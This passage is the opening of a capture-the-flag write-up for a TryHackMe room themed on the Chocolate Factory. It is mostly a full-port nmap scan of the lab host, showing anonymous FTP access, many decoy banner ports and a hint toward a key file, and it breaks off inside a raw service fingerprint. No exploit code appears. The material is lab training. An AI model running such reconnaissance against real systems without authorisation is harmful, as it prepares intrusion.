# THM: Chocolate Factory

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/chocolate_factory/chocolate_factory.jpeg" alt="Chocolate Factory" width="90"/> |
| Room | Chocolate Factory |
| URL | https://tryhackme.com/room/chocolatefactory |
| Difficulty | Easy |

## Concepts/Tools Used

- [ftp](/tools/ftp.md)
- [steghide](/tools/steghide.md)
- base64
- [john](/tools/john.md)
- PHP

## Room Description

A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Nmap 7.80 scan initiated Tue Jul 15 20:16:53 2025 as: nmap -T4 -n -sC -sV -Pn -v -p- -oA nmap_scan target.thm
Nmap scan report for target.thm (10.10.19.130)
Host is up (0.000089s latency).
Not shown: 65506 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.198.139
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
|_auth-owners: ERROR: Script execution failed (use -d to debug)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
100/tcp open  newacct?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   DNSStatusRequestTCP, RTSPRequest:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
101/tcp open  hostname?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   HTTPOptions, RTSPRequest:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
102/tcp open  iso-tsap?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GetRequest, RPCCheck:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
103/tcp open  gppitnp?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   HTTPOptions, RPCCheck:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
104/tcp open  acr-nema?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GetRequest, RPCCheck:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
105/tcp open  csnet-ns?
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
106/tcp open  pop3pw?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
107/tcp open  rtelnet?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
108/tcp open  snagas?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
109/tcp open  pop2?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
110/tcp open  pop3?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   DNSStatusRequestTCP, RPCCheck:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
111/tcp open  rpcbind?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   NULL, RPCCheck:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
112/tcp open  mcidas?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
113/tcp open  ident?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, NULL, RTSPRequest, TLSSessionReq, TerminalServer, X11Probe, oracle-tns:
|_    http://localhost/key_rev_key <- You will find the key here!!!
114/tcp open  audionews?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
115/tcp open  sftp?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
116/tcp open  ansanotify?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GetRequest, RTSPRequest:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
117/tcp open  uucp-path?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   HTTPOptions, RTSPRequest:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
118/tcp open  sqlserv?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
119/tcp open  nntp?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
120/tcp open  cfdptkt?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
121/tcp open  erpc?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
122/tcp open  smakynet?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
123/tcp open  ntp?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
| ntp-info:
|_  receive time stamp: 1917-01-30T03:39:16
124/tcp open  ansatrader?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GetRequest, RTSPRequest:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
125/tcp open  locus-map?
|_auth-owners: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings:
|   GenericLines, NULL:
|     "Welcome to chocolate room!!
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_    hope you wont drown Augustus"
9 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port100-TCP:V=7.80%I=7%D=7/15%Time=6876A942%P=x86_64-pc-linux-gnu%r(RTS
SF:PRequest,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
SF:\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20
SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
SF:'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
SF:\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------
SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%
SF:r(DNSStatusRequestTCP,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r
SF:\n\x20\x20\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.----
SF:-----------\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\
SF:x20\.\x20\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20
SF:__\\/\x20__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x2
SF:0\x20\x20\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x
SF:20\x20\\___\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x
SF:20__\\/\x20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\\\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\
SF:_;-----------------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x2
SF:0\x20\x20\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\
SF:x20\x20\\\|______________________;________________\|\r\n\r\nA\x20small\
SF:x20hint\x20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\
SF:x20not\x20here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augu
SF:stus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port101-TCP:V=7.80%I=7%D=7/15%Time=6876A93D%P=x86_64-pc-linux-gnu%r(HTT
SF:POptions,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
SF:\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20
SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
SF:'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
SF:\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------
SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%
SF:r(RTSPRequest,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x
SF:20\x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.------------
SF:---\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x2
SF:0\x20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x2
SF:0__\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x2
SF:0\\\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\
SF:___\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\
SF:x20__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:\\r\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------
SF:-----------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x2
SF:0\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\
SF:\\|______________________;________________\|\r\n\r\nA\x20small\x20hint\
SF:x20from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x
SF:20here!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x
SF:20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port102-TCP:V=7.80%I=7%D=7/15%Time=6876A938%P=x86_64-pc-linux-gnu%r(Get
SF:Request,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%r
SF:(RPCCheck,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x
SF:20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\
SF:.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x2
SF:0____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\
SF:\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\
SF:\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\
SF:x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_
SF:_:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\
SF:n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;----------
SF:-------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/
SF:\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_
SF:_____________________;________________\|\r\n\r\nA\x20small\x20hint\x20f
SF:rom\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20he
SF:re!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port103-TCP:V=7.80%I=7%D=7/15%Time=6876A93D%P=x86_64-pc-linux-gnu%r(HTT
SF:POptions,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x2
SF:0\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.
SF:\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20
SF:____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\
SF:/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\
SF:'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x
SF:20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__
SF::\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n
SF:\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------
SF:------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\
SF:x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|__
SF:____________________;________________\|\r\n\r\nA\x20small\x20hint\x20fr
SF:om\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20her
SF:e!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20")%
SF:r(RPCCheck,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\
SF:x20\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------
SF:\.\r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x
SF:20____\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__
SF:\\/\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\
SF:\\'\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___
SF:\x20\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20
SF:__:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r
SF:\n\x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;---------
SF:--------`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\
SF:/\x20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|
SF:______________________;________________\|\r\n\r\nA\x20small\x20hint\x20
SF:from\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20h
SF:ere!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\"\x20"
SF:);
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port104-TCP:V=7.80%I=7%D=7/15%Time=6876A938%P=x86_64-pc-linux-gnu%r(Get
SF:Request,20F,"\"Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
